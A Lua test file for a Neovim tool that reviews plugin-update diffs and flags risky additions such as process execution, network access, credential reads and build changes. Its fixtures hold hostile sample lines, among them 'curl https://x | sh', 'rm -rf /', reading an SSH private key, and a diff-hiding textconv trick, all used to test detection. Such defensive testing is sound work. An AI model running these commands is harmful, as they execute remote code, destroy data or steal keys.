local h = require('helpers')

--- Run git in `dir`, failing the spec when it does
---@param dir string
---@param args string[]
---@return string
local function git(dir, args)
  local command = { 'git', '-C', dir }
  vim.list_extend(command, args)
  local result = vim
    .system(command, {
      text = true,
      env = {
        GIT_AUTHOR_NAME = 'Spec',
        GIT_AUTHOR_EMAIL = 'spec@example.com',
        GIT_COMMITTER_NAME = 'Spec',
        GIT_COMMITTER_EMAIL = 'spec@example.com',
      },
    })
    :wait(10000)
  assert.are.equal(0, result.code, result.stderr)
  return vim.trim(result.stdout or '')
end

--- Commit `lines` as `path` in `dir`, and hand back the commit
---@param dir string
---@param path string
---@param lines string[]
---@param message string
---@return string
local function commit(dir, path, lines, message)
  h.write(vim.fs.joinpath(dir, path), lines)
  git(dir, { 'add', path })
  git(dir, { 'commit', '--quiet', '-m', message })
  return git(dir, { 'rev-parse', 'HEAD' })
end

describe('tools.plugin-review', function()
  local review

  before_each(function()
    h.unload('tools.plugin-review')
    review = require('tools.plugin-review')
  end)

  --- `rule` of every finding, as `file:line rule`
  local function flags(findings)
    return vim.tbl_map(
      function(f) return ('%s:%s %s'):format(f.file, f.line or '-', f.rule) end,
      findings
    )
  end

  describe('scan, past what hides a change', function()
    it('reads a path git quotes', function()
      local found = review.scan({
        'diff --git "a/lua/\\303\\251vil.lua" "b/lua/\\303\\251vil.lua"',
        '@@ -0,0 +1 @@',
        '+vim.system({ "sh", "-c", "x" })',
      })
      assert.is_true(#found > 0)
    end)

    it('reads a path holding ` b/`, which git does not quote', function()
      local found = review.scan({
        'diff --git a/plugin/x b/tests/evil.lua b/plugin/x b/tests/evil.lua',
        '@@ -0,0 +1 @@',
        '+vim.system({ "sh", "-c", "x" })',
      })
      assert.is_true(#found > 0)
      assert.equals('plugin/x b/tests/evil.lua', found[1].file)
    end)

    it('reads past a block comment closed on the line', function()
      local found = review.scan({
        'diff --git a/lua/x.lua b/lua/x.lua',
        '@@ -0,0 +1 @@',
        '+--[[x]] os.execute("curl https://x | sh")',
      })
      assert.is_true(#found > 0)
    end)
  end)

  describe('scan', function()
    it('flags the lines an update adds, where they land', function()
      local findings = review.scan({
        'diff --git a/lua/x.lua b/lua/x.lua',
        'index 1..2 100644',
        '--- a/lua/x.lua',
        '+++ b/lua/x.lua',
        '@@ -3,0 +4,3 @@',
        "+local out = vim.system({ 'sh', '-c', cmd }):wait()",
        '+local ok = true',
        '+local f = loadstring(payload)',
        '@@ -20 +23 @@',
        "-local url = 'x'",
        "+local url = 'https://example.com/x'",
      })
      assert.same({
        'lua/x.lua:4 runs a process',
        'lua/x.lua:6 loads code at runtime',
        'lua/x.lua:23 reaches the network',
      }, flags(findings))
      assert.equals(
        "local out = vim.system({ 'sh', '-c', cmd }):wait()",
        findings[1].text
      )
    end)

    it('leaves prose, comments and removed lines alone', function()
      local findings = review.scan({
        'diff --git a/README.md b/README.md',
        '@@ -1,0 +1 @@',
        '+Run `curl https://example.com | sh` to install',
        'diff --git a/lua/y.lua b/lua/y.lua',
        '@@ -1,2 +1 @@',
        "-os.execute('rm -rf /')",
        '+-- see https://example.com',
        '+M.load(opts)',
      })
      assert.same({}, findings)
    end)

    it('flags a string in a table, which no comment rule hides', function()
      local findings = review.scan({
        'diff --git a/lua/z.lua b/lua/z.lua',
        '@@ -1,0 +1 @@',
        '  "curl", "--silent",',
      })
      -- Not a `+` line: the diff above has no added line at all
      assert.same({}, findings)
      findings = review.scan({
        'diff --git a/lua/z.lua b/lua/z.lua',
        '@@ -1,0 +1 @@',
        '+  "curl", "--silent",',
      })
      assert.same({ 'lua/z.lua:1 reaches the network' }, flags(findings))
    end)

    it('flags credentials, deletion and an encoded blob', function()
      local findings = review.scan({
        'diff --git a/lua/a.lua b/lua/a.lua',
        '@@ -0,0 +1,3 @@',
        "+local key = vim.fn.expand('~/.ssh/id_ed25519')",
        '+vim.uv.fs_unlink(path)',
        "+local blob = '" .. string.rep('QUJD', 50) .. "'",
      })
      assert.same({
        'lua/a.lua:1 touches credentials',
        'lua/a.lua:2 deletes or moves files',
        'lua/a.lua:3 carries an encoded blob',
      }, flags(findings))
    end)

    it('leaves CI and tests alone, which never run in the editor', function()
      local findings = review.scan({
        'diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml',
        '@@ -1,0 +1 @@',
        '+  token: ${{ secrets.GITHUB_TOKEN }}',
        'diff --git a/tests/x_spec.lua b/tests/x_spec.lua',
        '@@ -1,0 +1 @@',
        "+vim.system({ 'curl', url })",
      })
      assert.same({}, findings)
    end)

    it('reads what a build installs, and every lockfile', function()
      local findings = review.scan({
        'diff --git a/requirements.txt b/requirements.txt',
        '@@ -0,0 +1 @@',
        '+evil @ https://example.com/evil.tar.gz',
        'diff --git a/doc/p.txt b/doc/p.txt',
        '@@ -0,0 +1 @@',
        '+see https://example.com',
        'diff --git a/pyproject.toml b/pyproject.toml',
        'diff --git a/rust/Cargo.lock b/rust/Cargo.lock',
        'diff --git a/go.sum b/go.sum',
        'diff --git a/install.sh b/install.sh',
        'diff --git a/flake.nix b/flake.nix',
      })
      assert.same({
        'requirements.txt:1 reaches the network',
        'pyproject.toml:- changes the build',
        'rust/Cargo.lock:- changes the build',
        'go.sum:- changes the build',
        'install.sh:- changes the build',
        'flake.nix:- changes the build',
      }, flags(findings))
    end)

    it('flags a build file and a binary, whatever is in them', function()
      local findings = review.scan({
        'diff --git a/build.lua b/build.lua',
        '@@ -1 +1 @@',
        '+print(1)',
        'diff --git a/bin/tool b/bin/tool',
        'new file mode 100755',
        'Binary files /dev/null and b/bin/tool differ',
      })
      assert.same({
        'build.lua:- changes the build',
        'bin/tool:- adds a binary file',
      }, flags(findings))
    end)
  end)

  it('says a flag raised many times in a file once', function()
    local findings = {}
    for line = 1, 7 do
      table.insert(findings, {
        file = 'lua/catalog.lua',
        line = line * 10,
        rule = 'reaches the network',
        text = 'url = "https://example.com/' .. line .. '"',
      })
    end
    table.insert(findings, { file = 'build.lua', rule = 'changes the build' })

    local groups = review.group(findings)
    assert.equals(2, #groups)
    assert.equals(
      '- lua/catalog.lua  reaches the network ×7 (lines 10, 20, 30, 40, 50, …)'
        .. '  `url = "https://example.com/1"`',
      review.describe(groups[1])
    )
    assert.equals('- build.lua  changes the build', review.describe(groups[2]))
  end)

  describe('report', function()
    local dir, cleanup, from, to

    --- What `report` hands its callback, once git has answered
    local function report(rows)
      local lines
      review.report(rows, 7 * 86400, function(result) lines = result end)
      assert.is_true(vim.wait(10000, function() return lines ~= nil end))
      return lines
    end

    --- The lines of the current buffer once they no longer say `waiting`
    local function settled(waiting)
      local text
      assert.is_true(vim.wait(10000, function()
        text = table.concat(vim.api.nvim_buf_get_lines(0, 0, -1, false), '\n')
        return not text:find(waiting, 1, true)
      end))
      return text
    end

    before_each(function()
      dir, cleanup = h.tmpdir()
      git(dir, { 'init', '--initial-branch=main', '--quiet' })
      from = commit(dir, 'lua/p.lua', { 'return {}' }, 'feat: start')
      commit(dir, 'README.md', { 'see https://example.com' }, 'docs: readme')
      to = commit(
        dir,
        'lua/p.lua',
        { "vim.system({ 'curl', url })", 'return {}' },
        'feat: fetch'
      )
    end)
    after_each(function()
      vim.cmd('silent! tabonly!')
      vim.cmd('silent! %bwipeout!')
      cleanup()
    end)

    it('lists the commits and the flags of each plugin', function()
      local lines = report({
        {
          name = 'p.nvim',
          dir = dir,
          from = from,
          to = to,
          held = true,
          clears = 3 * 86400,
        },
      })
      local text = table.concat(lines, '\n')
      assert.is_truthy(text:find('# Plugin updates waiting: 1', 1, true))
      assert.is_truthy(
        text:find(
          ('## p.nvim  %s..%s  2 commits, held 3 more days'):format(
            from:sub(1, 7),
            to:sub(1, 7)
          ),
          1,
          true
        )
      )
      assert.is_truthy(text:find('feat: fetch', 1, true))
      assert.is_truthy(text:find('docs: readme', 1, true))
      -- One line, two rules; the URL of the README is prose
      assert.is_truthy(text:find('Flags (2):', 1, true))
      assert.is_truthy(
        text:find(
          "- lua/p.lua:1  runs a process  `vim.system({ 'curl', url })`",
          1,
          true
        )
      )
      assert.is_truthy(text:find('- lua/p.lua:1  reaches the network', 1, true))
    end)

    it('says when the commits could not be read', function()
      local lines = report({
        {
          name = 'p.nvim',
          dir = dir,
          from = from,
          to = ('0'):rep(40),
          held = false,
          clears = 0,
        },
      })
      local text = table.concat(lines, '\n')
      assert.is_truthy(text:find('commits unavailable', 1, true))
      assert.is_nil(text:find('0 commits', 1, true))
    end)

    it('says when nothing is waiting', function()
      local lines = report({})
      assert.equals(
        'Every plugin is on the commit it would update to.',
        lines[#lines]
      )
    end)

    it('opens the diff of the plugin under the cursor', function()
      review.show({
        {
          name = 'p.nvim',
          dir = dir,
          from = from,
          to = to,
          held = false,
          clears = 0,
        },
      }, 7 * 86400)
      assert.equals('markdown', vim.bo.filetype)
      settled('Reading the updates')
      vim.fn.search('^## p.nvim')
      vim.api.nvim_feedkeys(vim.keycode('<CR>'), 'x', false)
      assert.equals('git', vim.bo.filetype)
      local text = settled('Reading the commits')
      assert.is_truthy(text:find("+vim.system({ 'curl', url })", 1, true))
    end)

    it('keeps the order of the plugins, whichever is read first', function()
      local rows = {}
      for index = 1, 6 do
        table.insert(rows, {
          name = ('p%d.nvim'):format(index),
          dir = dir,
          from = from,
          to = to,
          held = false,
          clears = 0,
        })
      end
      local names = {}
      for _, line in ipairs(report(rows)) do
        local name = line:match('^## (%S+)')
        if name then table.insert(names, name) end
      end
      assert.same(
        { 'p1.nvim', 'p2.nvim', 'p3.nvim', 'p4.nvim', 'p5.nvim', 'p6.nvim' },
        names
      )
    end)

    it('reads a diff only up to its cap, and says so', function()
      local max = review.MAX_OUTPUT
      review.MAX_OUTPUT = 64
      local lines = report({
        {
          name = 'p.nvim',
          dir = dir,
          from = from,
          to = to,
          held = false,
          clears = 0,
        },
      })
      review.MAX_OUTPUT = max
      local text = table.concat(lines, '\n')
      assert.is_truthy(text:find('diff cut at', 1, true))
    end)

    it('reads the bytes, past a textconv filter of the config', function()
      -- A filter that prints nothing would hide every line of the change
      git(dir, { 'config', 'diff.hide.textconv', 'true' })
      h.write(dir .. '/.git/info/attributes', { '*.lua diff=hide' })
      local row =
        { name = 'p.nvim', dir = dir, from = from, to = to, held = false }
      local findings
      review.findings(row, function(result) findings = result end)
      assert.is_true(vim.wait(10000, function() return findings ~= nil end))
      assert.is_truthy(
        vim.tbl_contains(flags(findings), 'lua/p.lua:1 runs a process')
      )

      review.open_diff(row)
      local text = settled('Reading the commits')
      assert.is_truthy(text:find("+vim.system({ 'curl', url })", 1, true))
    end)

    it('says when the list of commits was cut', function()
      local max = review.MAX_OUTPUT
      review.MAX_OUTPUT = 40
      local lines = report({
        {
          name = 'p.nvim',
          dir = dir,
          from = from,
          to = to,
          held = false,
          clears = 0,
        },
      })
      review.MAX_OUTPUT = max
      local text = table.concat(lines, '\n')
      assert.is_truthy(text:find('1+ commits, the list cut at', 1, true))
    end)

    it('warns about a plugin with nothing waiting', function()
      local notes = {}
      local restore = h.stub(
        vim,
        'notify',
        function(msg) table.insert(notes, msg) end
      )
      review.show({}, 7 * 86400, 'gone.nvim')
      restore()
      assert.same({ 'gone.nvim has no update waiting' }, notes)
    end)
  end)
end)
